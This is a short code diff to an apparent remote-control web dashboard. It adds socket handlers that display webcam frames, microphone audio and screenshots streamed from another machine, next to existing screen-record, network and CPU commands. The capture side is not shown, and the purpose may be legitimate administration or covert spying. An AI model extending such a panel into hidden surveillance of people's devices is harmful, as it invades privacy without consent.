@@ -142,6 +142,16 @@
         function stopScreenRecord() { socket.emit('command', 'stop_record'); }
         function toggleNetwork() { socket.emit('command', 'toggle_network'); }
         function toggleCPU() { socket.emit('command', 'toggle_cpu'); }
+
+        socket.on('webcam_data', (data) => {
+    document.getElementById('webcamFeed').src = `data:image/jpeg;base64,${data.image}`;
+});
+socket.on('mic_data', (data) => {
+    document.getElementById('micAudio').src = `data:audio/wav;base64,${data.audio}`;
+});
+socket.on('screenshot_data', (data) => {
+    document.getElementById('screenshotPreview').src = `data:image/jpeg;base64,${data.image}`;
+});
     </script>
 </body>
 </html>
